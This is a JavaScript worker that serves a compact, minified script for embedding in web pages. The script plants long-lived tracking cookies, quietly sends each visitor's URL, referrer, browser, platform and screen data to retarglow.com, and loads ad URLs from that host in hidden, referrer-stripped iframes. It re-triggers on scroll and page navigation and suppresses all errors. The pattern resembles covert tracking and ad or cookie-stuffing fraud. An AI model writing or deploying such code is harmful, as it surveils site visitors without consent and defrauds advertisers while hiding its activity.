export default {
  async fetch(request, env, ctx) {
    const headers = {
      "Content-Type": "application/javascript",
      "Access-Control-Allow-Origin": "*"
    };

    const js = `(function(){try{const c="default",_r=localStorage.getItem("_r")||crypto.randomUUID();localStorage.setItem("_r",_r);document.cookie="_r="+_r+";path=/;max-age=2592000;SameSite=Lax";document.cookie="smc_uid="+_r+";path=/;max-age=31536000;SameSite=Lax";document.cookie="user_id_t="+_r+";path=/;max-age=31536000;SameSite=Lax";const u=location.href,r=document.referrer,n=navigator.userAgent,b=n.includes("Chrome")?"C":n.includes("Firefox")?"F":n.includes("Safari")?"S":"U",d=/Mobi|Android/i.test(n)?"M":"D",o=navigator.platform,s=screen.width+"x"+screen.height,p={cid:c,u,r,ua:n,dt:d,b,os:o,sr:s,cm:{_r},domain:location.hostname};fetch("https://retarglow.com/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(p)});let triggered=!1;const once=sessionStorage.getItem("i_"+c),inject=()=>{if(triggered||once)return;triggered=!0;fetch("https://retarglow.com/serve",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({u,cm:{_r}})}).then(r=>r.json()).then(j=>{if(j.ad_url){const f=document.createElement("iframe");f.style.display="none",f.referrerPolicy="no-referrer",f.src=j.ad_url.replace("{{_r}}",_r),document.body.appendChild(f),sessionStorage.setItem("i_"+c,"1")}})};setTimeout(inject,2e3),window.addEventListener("scroll",()=>{inject(),window.removeEventListener("scroll",inject)}),setTimeout(inject,5e3),["pushState","replaceState"].forEach(fn=>{const orig=history[fn];history[fn]=function(){const r=orig.apply(this,arguments);return triggered=!1,sessionStorage.removeItem("i_"+c),setTimeout(inject,1500),r}}),addEventListener("popstate",()=>{triggered=!1,sessionStorage.removeItem("i_"+c),setTimeout(inject,1500)})}catch(e){}})();`;

    return new Response(js, { status: 200, headers });
  }
};
